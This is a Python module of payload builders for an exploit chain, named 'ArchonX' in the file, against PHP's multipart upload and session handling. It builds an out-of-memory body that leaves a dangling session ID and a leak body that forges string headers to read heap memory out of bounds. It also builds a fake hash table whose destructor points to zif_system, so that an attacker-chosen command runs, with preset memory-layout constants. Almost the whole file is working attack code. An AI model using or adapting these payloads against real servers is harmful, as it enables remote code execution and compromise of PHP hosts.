"""Multipart payload builders for the ArchonX exploit chain.

Each builder produces a raw multipart body (without HTTP headers) that
triggers a specific behavior in PHP's multipart parser and session
handling.

  A1 (OOM payload)
      Triggers OOM during END cleanup send_cookie. Uses nested empty file
      fields, filler values, and upload progress to exhaust memory inside
      php_url_encode → php_session_reset_id → php_session_initialize →
      php_session_rfc1867_callback. Leaves dangling PS(id) and PS(mod_data).

  B1 (Leak payload)
      Exploits the dangling stale session ID for an out-of-bounds read via
      Set-Cookie. Places a fake zend_string header at the stale ID address
      with a controlled length field, causing php_url_encode to read heap
      memory far past the legitimate string boundary.

  Fake HashTable
      Builds a 384-byte forged zend_array whose pDestructor points to
      zif_system. When zend_hash_destroy runs at shutdown, it calls
      system(cmd) with the attacker's argument.
"""
from __future__ import annotations

import struct

BOUNDARY = b"C" * 10


def _part(name: bytes, value: bytes, boundary: bytes = BOUNDARY,
          filename: bytes | None = None, ctype: bytes | None = None) -> bytes:
    out = bytearray()
    out.extend(b"--" + boundary +
               b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value + b"\r\n")
    return bytes(out)


def _nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    return (("files[R%05d%s]" % (i, "K" * key_pad)).encode() +
            b"[a]" * (depth - 2))


# ─────────────────────────────────────────────────────────────────────────
# A1: OOM during END cleanup send_cookie
# ─────────────────────────────────────────────────────────────────────────
def build_a1_body(parts: int = 860, depth: int = 64, key_pad: int = 90,
                  fillers128: int = 14, big: int = 78, big_len: int = 8000,
                  burners: int = 20, burner_len: int = 4000,
                  progress_len: int = 4000, sid_hex: str = "00",
                  tail: int = 0) -> bytes:
    out = bytearray()
    out.extend(_part(b"PHPSESSID", bytes.fromhex(sid_hex)))

    for i in range(parts):
        ctype = (b"C" * 103 if i == 0
                 else b"C" * 231 if i == 1
                 else b"application/octet-stream")
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   _nest_name(i, depth, key_pad) + b"\"")
        out.extend(b"; filename=\"A\"" if i < 2 else b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")

    for i in range(fillers128):
        out.extend(_part(("f%04d" % i).encode().ljust(103, b"x")[:103],
                         b"v" * 8))

    for i in range(big):
        out.extend(_part(("b%04d" % i).encode(), b"B" * big_len))

    for i in range(burners):
        out.extend(_part(("u%02d" % i).encode(), b"U" * burner_len))

    out.extend(_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len))

    for i in range(tail):
        name = ("t%02d" % i).encode().ljust(35, b"t")[:35]
        out.extend(_part(name, b"T" * 35))

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# ─────────────────────────────────────────────────────────────────────────
# B1: info leak via stale-id OOB read
# ─────────────────────────────────────────────────────────────────────────
def _tag8(idx: int, tagged: bool) -> bytes:
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def _forge_fill_value(pages: int, page: int, fake_len: int,
                      idx: int = 0, tagged: bool = False) -> bytes:
    length = pages * 4096 - 25
    v = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= length:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        struct.pack_into("<I", v, hdr + 0x04, 0x16)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        v[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(v)


def _forge_value(page: int, fake_len: int, idx: int = 0,
                 tagged: bool = False) -> bytes:
    hdr = page * 0x1000 - 0x1018
    tail = 8
    length = hdr + 0x18 + tail
    v = bytearray(b"A" * length)
    struct.pack_into("<I", v, hdr + 0x00, 0)
    struct.pack_into("<I", v, hdr + 0x04, 0x16)
    struct.pack_into("<Q", v, hdr + 0x08, 0)
    struct.pack_into("<Q", v, hdr + 0x10, fake_len)
    v[hdr + 0x18:hdr + 0x18 + tail] = _tag8(idx, tagged)[:tail]
    return bytes(v)


def build_b1_body(spec: str, sid: str = "a", progress: str = "k0",
                  name_len: int = 120, fake_len: int = 0xC8000,
                  tagged: bool = True) -> bytes:
    out = bytearray()
    has_p = any(it.partition(":")[0] == "P"
                for it in spec.replace(",", " ").split())

    out.extend(_part(b"PHPSESSID", sid.encode()))
    if not has_p:
        out.extend(_part(b"PHP_SESSION_UPLOAD_PROGRESS", progress.encode()))

    idx = 0
    for item in spec.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            pages = int(arg, 0)
            length = pages * 4096 - 25
            v = (b"A" if kind == "F" else b"S") * length
        elif kind == "A":
            v = _forge_value(int(arg, 0), fake_len, idx, tagged)
        elif kind == "X":
            cnt = int(arg, 0)
            for _ in range(cnt):
                nm = ("x%05d" % idx).encode() + b"[a]" * 12
                out.extend(_part(nm, b"v"))
                idx += 1
            continue
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _forge_fill_value(int(pages_s, 0), int(page_s, 0),
                                  fake_len, idx, tagged)
        elif kind == "P":
            page = int(arg, 0)
            d = page * 0x1000 - 0x1018
            voff = d - 16
            pv = bytearray(b"K" * (voff + 0x18 + 8))
            struct.pack_into("<I", pv, voff + 0x00, 0)
            struct.pack_into("<I", pv, voff + 0x04, 0x16)
            struct.pack_into("<Q", pv, voff + 0x08, 0)
            struct.pack_into("<Q", pv, voff + 0x10, fake_len)
            pv[voff + 0x18:voff + 0x18 + 8] = b"/99BBBBB"
            out.extend(_part(b"PHP_SESSION_UPLOAD_PROGRESS", bytes(pv)))
            idx += 1
            continue
        else:
            raise ValueError(f"unknown spec item: {item!r}")

        name = (b"f%04d" % idx).ljust(name_len, b"f")[:name_len]
        out.extend(_part(name, v))
        idx += 1

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


# ─────────────────────────────────────────────────────────────────────────
# Fake HashTable (pDestructor = zif_system)
# ─────────────────────────────────────────────────────────────────────────
def build_fake_hashtable(htdata_addr: int, zif_addr: int, cmd: bytes,
                         size: int = 384, inband: bool = False) -> bytes:
    if not inband:
        return _build_fake_hashtable_legacy(htdata_addr, zif_addr, cmd, size)
    return _build_fake_hashtable_inband(htdata_addr, zif_addr, cmd, size)


def _build_fake_hashtable_legacy(htdata_addr: int, zif_addr: int, cmd: bytes,
                                 size: int = 384) -> bytes:
    if len(cmd) > size - 0x98 - 1:
        raise ValueError(
            f"command too long ({len(cmd)}B) for {size}-byte carrier"
        )
    ht = bytearray(b"\x00" * size)

    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata_addr + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_addr)

    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif_addr)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata_addr + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)

    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def _build_fake_hashtable_inband(htdata_addr: int, zif_addr: int, cmd: bytes,
                                 size: int = 384) -> bytes:
    if len(cmd) > size - 0xB8 - 1:
        raise ValueError(
            f"command too long ({len(cmd)}B) for {size}-byte carrier"
        )
    ht = bytearray(b"\x00" * size)

    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x11, 0xFFFFFFFE)
    struct.pack_into("<Q", ht, 0x10, htdata_addr + 0x40)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 2, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_addr)

    struct.pack_into("<II", ht, 0x38, 0xFFFFFFFF, 0xFFFFFFFF)

    E = 0x40
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, htdata_addr + 0xF0)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<Q", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x48, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata_addr + 0xA0)
    struct.pack_into("<I", ht, E + 0x58, 6)

    struct.pack_into("<II", ht, 0xA0, 1, 0x106)
    struct.pack_into("<Q", ht, 0xA8, 0)
    struct.pack_into("<Q", ht, 0xB0, len(cmd))
    ht[0xB8:0xB8 + len(cmd)] = cmd
    ht[0xB8 + len(cmd)] = 0
    return bytes(ht)


# ─────────────────────────────────────────────────────────────────────────
# Standard 128M layout constants
# ─────────────────────────────────────────────────────────────────────────
LEAK_SPEC_128M = ",".join(
    ["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"]
)

QUERY_STRING_128M = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
